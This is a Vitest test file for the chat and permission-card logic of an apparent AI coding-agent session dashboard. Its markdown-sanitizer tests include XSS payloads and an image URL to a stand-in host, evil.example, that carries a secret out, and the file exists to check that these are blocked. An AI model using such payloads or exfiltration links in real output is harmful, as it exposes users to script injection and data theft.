import { describe, expect, it } from 'vitest'
import { chatRows, chatItems, hasChat, cardAsk, chatBadge, actedLine, chatPreview, nextChat, cardKey } from '../src/logic'
import { mk, perm } from './helpers'
import { renderMarkdown } from '../src/markdown'

describe('chatRows', () => {
  it('puts sessions needing you first in inbox order, then the rest newest first', () => {
    const rows = chatRows([
      mk('old-idle', { state: 'idle', updatedAt: 10 }),
      mk('done', { state: 'done', card: { kind: 'done', summary: 'Shipped it' }, waitingSince: 5 }),
      mk('new-work', { state: 'working', updatedAt: 30 }),
      mk('perm', { state: 'waiting', card: perm, waitingSince: 50 }),
    ])
    expect(rows.map((r) => [r.s.id, r.needs])).toEqual([['perm', true], ['done', true], ['new-work', false], ['old-idle', false]])
    expect(rows[0].at).toBe(50)
    expect(rows[2].at).toBe(30)
  })
  it('previews the card, else the status line, else the last prompt, else the task', () => {
    const [done] = chatRows([mk('a', { state: 'done', card: { kind: 'done', summary: 'All green' }, now: 'ignored' })])
    expect(done.preview).toBe('All green')
    expect(chatRows([mk('b', { now: 'Running tests' })])[0].preview).toBe('Running tests')
    expect(chatRows([mk('c', { lastPrompt: 'fix it', task: 'first' })])[0].preview).toBe('fix it')
    expect(chatRows([mk('d', { task: 'first' })])[0].preview).toBe('first')
    expect(chatRows([mk('e')])[0].preview).toBe('')
  })
  it('previews a permission card as what it would actually run, edit or open', () => {
    expect(chatRows([mk('p', { state: 'waiting', card: perm })])[0].preview).toBe('Run: ls')
    expect(chatPreview({ ...perm, command: null, target: { type: 'file', value: '/r/a.ts' } })).toBe('Edit: /r/a.ts')
    expect(chatPreview({ ...perm, command: 'rm -rf build\necho done' })).toBe('Run: rm -rf build')
    expect(chatPreview({ kind: 'done', summary: 'Shipped' })).toBe(cardAsk({ kind: 'done', summary: 'Shipped' }))
  })
})

describe('chatItems', () => {
  it('folds each run of steps into one item and keeps messages in order', () => {
    expect(chatItems([
      { who: 'you', text: 'fix the bug' },
      { who: 'step', text: 'Read: a.ts' },
      { who: 'step', text: 'Edit: a.ts' },
      { who: 'claude', text: 'Fixed.' },
      { who: 'step', text: 'Bash: npm test' },
    ])).toEqual([
      { who: 'you', text: 'fix the bug' },
      { who: 'steps', lines: ['Read: a.ts', 'Edit: a.ts'] },
      { who: 'claude', text: 'Fixed.' },
      { who: 'steps', lines: ['Bash: npm test'] },
    ])
  })
})

describe('hasChat', () => {
  it('is Claude only, and never a ghost', () => {
    expect(hasChat({})).toBe(true)
    expect(hasChat({ agent: 'claude' })).toBe(true)
    expect(hasChat({ agent: 'codex' })).toBe(false)
    expect(hasChat({ ghost: { pid: 1, cwd: '/', repo: null, worldId: null, sessionId: null, inTmux: false, since: 0 } })).toBe(false)
  })
})

describe('renderMarkdown', () => {
  it('escapes raw HTML, drops javascript: links and opens links beside the app', () => {
    const out = renderMarkdown('<script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1)) https://example.com')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('<img')
    expect(out).not.toContain('href="javascript:')
    expect(out).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">')
  })
  it('never loads an image: an image URL could carry data out the moment the chat opens', () => {
    const out = renderMarkdown('![x](https://evil.example/p?d=SECRET)')
    expect(out).not.toContain('<img')
    expect(out).toContain('!<a href="https://evil.example/p?d=SECRET" target="_blank"')
  })
  it('renders code fences', () => {
    expect(renderMarkdown('```ts\nconst a = 1\n```')).toContain('<pre><code class="language-ts">')
  })
})

describe('chatBadge', () => {
  it('tells blocked, failed and finished apart', () => {
    expect(chatBadge(perm)).toEqual({ label: 'Needs you', tone: 'wait' })
    expect(chatBadge({ kind: 'question', requestId: 'q', questions: [] }).label).toBe('Needs you')
    expect(chatBadge({ kind: 'asking', summary: 'yes?' }).label).toBe('Needs you')
    expect(chatBadge({ kind: 'error', summary: 'boom' })).toEqual({ label: 'Problem', tone: 'err' })
    expect(chatBadge({ kind: 'done', summary: null })).toEqual({ label: 'To review', tone: 'ok' })
  })
})

describe('actedLine', () => {
  it('says what you did on the card', () => {
    expect(actedLine(perm, 'allow')).toBe('You allowed once: ls')
    expect(actedLine(perm, 'deny')).toBe('You denied: ls')
    expect(actedLine(perm, { scope: 'repo' })).toBe('You always allow (repo): ls')
    expect(actedLine({ kind: 'question', requestId: 'q', questions: [] }, { answers: { Parent: 'Under Restaurants' } })).toBe('You answered: Under Restaurants')
    expect(actedLine({ kind: 'done', summary: null }, 'ack')).toBe('You marked it reviewed')
  })
})

describe('nextChat', () => {
  it('skips this chat and the cards you passed on, but not a new card from a skipped session', () => {
    const a = mk('a', { state: 'waiting', card: { ...perm, requestId: 'r1' } })
    const b = mk('b', { state: 'waiting', card: { ...perm, requestId: 'r2' } })
    const c = mk('c', { state: 'waiting', card: { ...perm, requestId: 'r3' } })
    expect(nextChat([a, b, c], 'a', new Set())?.id).toBe('b')
    expect(nextChat([a, b, c], 'a', new Set([cardKey(b)]))?.id).toBe('c')
    expect(nextChat([a, b], 'a', new Set([cardKey(b)]))).toBeNull()
    const bAgain = { ...b, card: { ...perm, requestId: 'r9' } }
    expect(nextChat([a, bAgain], 'a', new Set([cardKey(b)]))?.id).toBe('b')
  })
})
